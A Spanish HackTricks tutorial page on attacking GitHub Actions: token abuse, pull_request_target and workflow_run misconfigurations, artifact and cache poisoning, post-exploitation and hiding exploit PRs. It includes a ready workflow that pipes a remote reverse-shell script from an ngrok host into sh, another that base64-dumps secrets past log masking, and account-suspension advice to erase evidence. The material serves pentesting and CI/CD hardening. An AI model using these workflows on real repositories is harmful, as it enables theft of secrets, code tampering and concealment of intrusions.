# Abuso de Github Actions

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop).
* Obtén el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## Información básica

En esta página encontrarás:

* Un **resumen de todos los impactos** que puede tener un atacante al acceder a una Acción de Github.
* Diferentes formas de **acceder a una acción**:
* Tener **permisos** para crear la acción.
* Abusar de los desencadenadores relacionados con las **solicitudes de extracción**.
* Abusar de **otras técnicas de acceso externo**.
* **Pivotar** desde un repositorio que ya ha sido comprometido.
* Por último, una sección sobre **técnicas de post-explotación para abusar de una acción desde el interior** (causando los impactos mencionados).

## Resumen de impactos

Para obtener una introducción sobre [**Github Actions, consulta la información básica**](../basic-github-information.md#github-actions).

En caso de que puedas **ejecutar acciones de Github arbitrarias/inyectar código** en un **repositorio**, podrías ser capaz de:

* **Robar** los **secretos** de ese repositorio/organización.
* Si solo puedes inyectar, puedes robar lo que ya esté presente en el flujo de trabajo.
* Abusar de los **privilegios del repositorio** para acceder a otras plataformas como AWS y GCP.
* **Ejecutar código en trabajadores personalizados** (si se utilizan trabajadores personalizados) e intentar pivotar desde allí.
* **Sobrescribir** el **código** del repositorio.
* Esto depende de los privilegios del `GITHUB_TOKEN` (si los hay).
* **Comprometer** **implementaciones** y otros **artefactos**.
* Si el código está implementando o almacenando algo, podrías modificarlo y obtener un mayor acceso.

## GITHUB\_TOKEN

Este "**secreto**" (proveniente de `${{ secrets.GITHUB_TOKEN }}` y `${{ github.token }}`) se otorga cuando el administrador habilita esta opción:

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

Este token es el mismo que utilizará una **Aplicación de Github**, por lo que puede acceder a los mismos puntos finales: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github debería lanzar un [**flujo**](https://github.com/github/roadmap/issues/74) que permita el acceso **entre repositorios** dentro de GitHub, para que un repositorio pueda acceder a otros repositorios internos utilizando el `GITHUB_TOKEN`.
{% endhint %}

Puedes ver los posibles **permisos** de este token en: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Ten en cuenta que el token **caduca después de que se haya completado el trabajo**.\
Estos tokens se ven así: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algunas cosas interesantes que puedes hacer con este token:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Aprobar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Crear PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Ten en cuenta que en varias ocasiones podrás encontrar **tokens de usuario de Github dentro de las variables de entorno de las Acciones de Github o en los secretos**. Estos tokens pueden darte más privilegios sobre el repositorio y la organización.
{% endhint %}

<details>

<summary>Lista de secretos en la salida de la Acción de Github</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obtener una shell inversa con secretos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

## Ejecución Permitida

{% hint style="info" %}
Esta sería la forma más fácil de comprometer las acciones de Github, ya que en este caso se supone que tienes acceso para **crear un nuevo repositorio en la organización**, o tienes **privilegios de escritura sobre un repositorio**.

Si te encuentras en esta situación, simplemente puedes revisar las [técnicas de post-explotación](./#técnicas-de-post-explotación-desde-el-interior-de-una-acción).
{% endhint %}

### Ejecución desde la Creación de un Repositorio

En caso de que los miembros de una organización puedan **crear nuevos repositorios** y puedas ejecutar acciones de Github, puedes **crear un nuevo repositorio y robar las credenciales establecidas a nivel de organización**.

### Ejecución desde una Nueva Rama

Si puedes **crear una nueva rama en un repositorio que ya contiene una Acción de Github** configurada, puedes **modificarla**, **subir** el contenido y luego **ejecutar esa acción desde la nueva rama**. De esta manera, puedes **filtrar las credenciales de nivel de repositorio y organización** (pero necesitas saber cómo se llaman).

Puedes hacer que la acción modificada sea ejecutable **manualmente**, cuando se **crea una solicitud de extracción (PR)** o cuando se **envía código** (dependiendo de cuánto ruido quieras hacer):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Ejecución bifurcada

{% hint style="info" %}
Existen diferentes disparadores que podrían permitir a un atacante **ejecutar una Acción de Github de otro repositorio**. Si esas acciones desencadenantes están mal configuradas, un atacante podría comprometerlas.
{% endhint %}

### `pull_request`

El disparador de flujo de trabajo **`pull_request`** ejecutará el flujo de trabajo cada vez que se reciba una solicitud de extracción con algunas excepciones: por defecto, si es la **primera vez** que estás **colaborando**, algún **mantenedor** deberá **aprobar** la **ejecución** del flujo de trabajo:

<figure><img src="../../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como la limitación **predeterminada** es para **contribuyentes de primera vez**, podrías contribuir **solucionando un error/errata válida** y luego enviar **otras solicitudes de extracción para abusar de tus nuevos privilegios de `pull_request`**.

**Probé esto y no funciona**: ~~Otra opción sería crear una cuenta con el nombre de alguien que contribuyó al proyecto y eliminó su cuenta.~~
{% endhint %}

Además, por defecto **evita los permisos de escritura** y el **acceso a secretos** en el repositorio de destino, como se menciona en la [**documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> A excepción de `GITHUB_TOKEN`, **los secretos no se pasan al runner** cuando se desencadena un flujo de trabajo desde un repositorio **bifurcado**. El **`GITHUB_TOKEN` tiene permisos de solo lectura** en las solicitudes de extracción **de repositorios bifurcados**.

Un atacante podría modificar la definición de la Acción de Github para ejecutar cosas arbitrarias y agregar acciones arbitrarias. Sin embargo, no podrá robar secretos ni sobrescribir el repositorio debido a las limitaciones mencionadas.

{% hint style="danger" %}
**Sí, si el atacante cambia en la solicitud de extracción la Acción de Github que se desencadenará, su Acción de Github será la que se utilizará y no la del repositorio original.**
{% endhint %}

Como el atacante también controla el código que se ejecuta, incluso si no hay secretos ni permisos de escritura en el `GITHUB_TOKEN`, el atacante podría, por ejemplo, **cargar artefactos maliciosos**.

### **`pull_request_target`**

El disparador de flujo de trabajo **`pull_request_target`** tiene **permisos de escritura** en el repositorio de destino y **acceso a secretos** (y no solicita permiso).

Ten en cuenta que el disparador de flujo de trabajo **`pull_request_target`** se **ejecuta en el contexto base** y no en el proporcionado por la solicitud de extracción (para **no ejecutar código no confiable**). Para obtener más información sobre `pull_request_target`, [**consulta la documentación**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Además, para obtener más información sobre este uso peligroso específico, consulta esta [**publicación de blog de Github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Puede parecer que debido a que el flujo de trabajo **ejecutado** es el definido en la **base** y no en la solicitud de extracción, es **seguro** usar **`pull_request_target`**, pero hay **algunos casos en los que no lo es**.

Y este tendrá **acceso a secretos**.

### `workflow_run`

El disparador [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite ejecutar un flujo de trabajo desde otro cuando está `completado`, `solicitado` o `en_progreso`.

En este ejemplo, se configura un flujo de trabajo para ejecutarse después de que se complete el flujo de trabajo separado "Ejecutar pruebas":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Además, según la documentación: El flujo de trabajo iniciado por el evento `workflow_run` puede **acceder a secretos y escribir tokens, incluso si el flujo de trabajo anterior no lo hizo**.

Este tipo de flujo de trabajo podría ser atacado si depende de un flujo de trabajo que puede ser activado por un usuario externo a través de `pull_request` o `pull_request_target`. Algunos ejemplos vulnerables se pueden encontrar en [**este blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** El primero consiste en que el flujo de trabajo activado por `workflow_run` descargue el código del atacante: `${{ github.event.pull_request.head.sha }}`\
El segundo consiste en pasar un artefacto desde el código no confiable al flujo de trabajo `workflow_run` y utilizar el contenido de este artefacto de una manera que lo haga vulnerable a RCE.

## Abuso de la ejecución bifurcada

Hemos mencionado todas las formas en que un atacante externo podría lograr que un flujo de trabajo de GitHub se ejecute, ahora veamos cómo estas ejecuciones, si están mal configuradas, podrían ser abusadas:

### Ejecución de checkout no confiable

En el caso de `pull_request`, el flujo de trabajo se ejecutará en el contexto de la PR (por lo que ejecutará el código malicioso de las PR), pero alguien necesita autorizarlo primero y se ejecutará con algunas [limitaciones](./#pull\_request).

En el caso de un flujo de trabajo que utiliza `pull_request_target` o `workflow_run` y depende de un flujo de trabajo que puede ser activado desde `pull_request_target` o `pull_request`, se ejecutará el código del repositorio original, por lo que el atacante no puede controlar el código ejecutado.

{% hint style="danger" %}
Sin embargo, si la **acción** tiene un **checkout explícito de PR** que **obtendrá el código de la PR** (y no de la base), utilizará el código controlado por el atacante. Por ejemplo (ver línea 12 donde se descarga el código de la PR):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSEGURO. Proporcionado solo como ejemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

El código potencialmente no confiable se ejecuta durante `npm install` o `npm build`, ya que los scripts de compilación y los paquetes referenciados están controlados por el autor de la PR.

{% hint style="warning" %}
Una búsqueda de github para encontrar acciones vulnerables es: `event.pull_request pull_request_target extension:yml`, sin embargo, hay diferentes formas de configurar los trabajos para que se ejecuten de manera segura incluso si la acción está configurada de manera insegura (como usar condicionales sobre quién es el actor que genera la PR).
{% endhint %}

### Inyecciones de script en el contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Tenga en cuenta que hay ciertos [**contextos de github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cuyos valores son **controlados** por el **usuario** que crea la PR. Si la acción de GitHub está utilizando esos datos para ejecutar cualquier cosa, podría llevar a una ejecución de código arbitrario:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inyección de script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Según la documentación: Puede hacer que una **variable de entorno esté disponible para cualquier paso posterior** en un trabajo de flujo de trabajo definiendo o actualizando la variable de entorno y escribiendo esto en el archivo de entorno **`GITHUB_ENV`**.

Si un atacante pudiera **inyectar cualquier valor** dentro de esta variable **env**, podría inyectar variables de entorno que podrían ejecutar código en pasos siguientes, como **LD\_PRELOAD** o **NODE\_OPTIONS**.

Por ejemplo ([**este**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) y [**este**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagina un flujo de trabajo que confía en un artefacto cargado para almacenar su contenido dentro de la variable de entorno **`GITHUB_ENV`**. Un atacante podría cargar algo como esto para comprometerlo:

<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

### Acciones de terceros vulnerables de Github

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como se menciona en [**esta publicación de blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta Acción de Github permite acceder a artefactos de diferentes flujos de trabajo e incluso repositorios.

El problema es que si el parámetro **`path`** no está configurado, el artefacto se extraerá en el directorio actual y puede sobrescribir archivos que podrían ser utilizados o incluso ejecutados más adelante en el flujo de trabajo. Por lo tanto, si el artefacto es vulnerable, un atacante podría abusar de esto para comprometer otros flujos de trabajo que confían en el artefacto.

Ejemplo de flujo de trabajo vulnerable:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Esto podría ser atacado con este flujo de trabajo:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Otro acceso externo

### Secuestro de repositorio de espacio de nombres eliminado

Este es un buen artículo de blog para leer sobre vulnerabilidades corregidas que permitirían a un atacante robar un espacio de nombres eliminado para robar un repositorio famoso (potencialmente debido a un cambio de nombre del espacio de nombres): [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivoteo de repositorio

{% hint style="info" %}
En esta sección hablaremos sobre técnicas que permitirían **pivoteo de un repositorio a otro** suponiendo que tenemos algún tipo de acceso en el primero (ver la sección anterior).
{% endhint %}

### Envenenamiento de caché

Se mantiene una caché entre **ejecuciones de flujo de trabajo en la misma rama**. Esto significa que si un atacante **compromete** un **paquete** que luego se almacena en la caché y es **descargado** y ejecutado por un flujo de trabajo **más privilegiado**, también podrá **comprometer** ese flujo de trabajo.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamiento de artefactos

Los flujos de trabajo podrían usar **artefactos de otros flujos de trabajo e incluso repositorios**, si un atacante logra **comprometer** la Acción de Github que **carga un artefacto** que luego es utilizado por otro flujo de trabajo, podría **comprometer los otros flujos de trabajo**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## Post Explotación desde una Acción

### Acceso a AWS y GCP a través de OIDC

Consulte las siguientes páginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acceso a secretos <a href="#accessing-secrets" id="accessing-secrets"></a>

Si está inyectando contenido en un script, es interesante saber cómo puede acceder a los secretos:

* Si el secreto o token se establece como una **variable de entorno**, se puede acceder directamente a través del entorno utilizando **`printenv`**.
* Si el secreto se utiliza **directamente en una expresión**, el script de shell generado se almacena **en disco** y es accesible.
*   Para una **acción personalizada**, el riesgo puede variar según cómo un programa esté utilizando el secreto que obtuvo del **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abuso de runners autohospedados

La forma de encontrar qué **Acciones de Github se están ejecutando en infraestructura no relacionada con Github** es buscar **`runs-on: self-hosted`** en la configuración yaml de la Acción de Github.

Los runners **autohospedados** podrían tener acceso a **información extra sensible**, a otros **sistemas de red** (¿puntos finales vulnerables en la red? ¿servicio de metadatos?) o, incluso si está aislado y destruido, **más de una acción podría ejecutarse al mismo tiempo** y la maliciosa podría **robar los secretos** de la otra.

### Registro de imágenes Docker de Github

Es posible crear acciones de Github que **compilen y almacenen una imagen Docker dentro de Github**.\
Un ejemplo se puede encontrar en el siguiente desplegable:

<details>

<summary>Acción de Github para compilar y publicar una imagen Docker</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como pudiste ver en el código anterior, el registro de Github está alojado en **`ghcr.io`**.

Un usuario con permisos de lectura sobre el repositorio podrá descargar la imagen de Docker utilizando un token de acceso personal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Entonces, el usuario podría buscar **secretos filtrados en las capas de la imagen Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Información sensible en los registros de Github Actions

Incluso si **Github** intenta **detectar valores secretos** en los registros de las acciones y **evitar mostrarlos**, **otros datos sensibles** que podrían haberse generado en la ejecución de la acción no se ocultarán. Por ejemplo, un JWT firmado con un valor secreto no se ocultará a menos que esté [configurado específicamente](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cubriendo tus huellas

(Técnica de [**aquí**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) En primer lugar, cualquier PR planteado es claramente visible para el público en Github y para la cuenta de GitHub objetivo. En GitHub, por defecto, **no podemos eliminar un PR de Internet**, pero hay un giro. Para las cuentas de Github que están **suspendidas** por Github, todos sus **PR se eliminan automáticamente** y se eliminan de Internet. Entonces, para ocultar tu actividad, debes suspender tu **cuenta de GitHub o que tu cuenta sea marcada**. Esto **ocultará todas tus actividades** en GitHub de Internet (básicamente eliminará todos tus PR de explotación).

Una organización en GitHub es muy proactiva en informar a las cuentas a GitHub. Todo lo que tienes que hacer es compartir "algo" en un problema y se asegurarán de que tu cuenta sea suspendida en 12 horas :p y ahí lo tienes, has hecho que tu explotación sea invisible en github.

{% hint style="warning" %}
La única forma en que una organización puede darse cuenta de que ha sido objetivo es revisar los registros de GitHub desde SIEM, ya que desde la interfaz de GitHub, el PR se eliminaría.
{% endhint %}

<details>

<summary><strong>¡Apoya a HackTricks y obtén beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **última versión de PEASS o descargar HackTricks en PDF**, ¡consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>
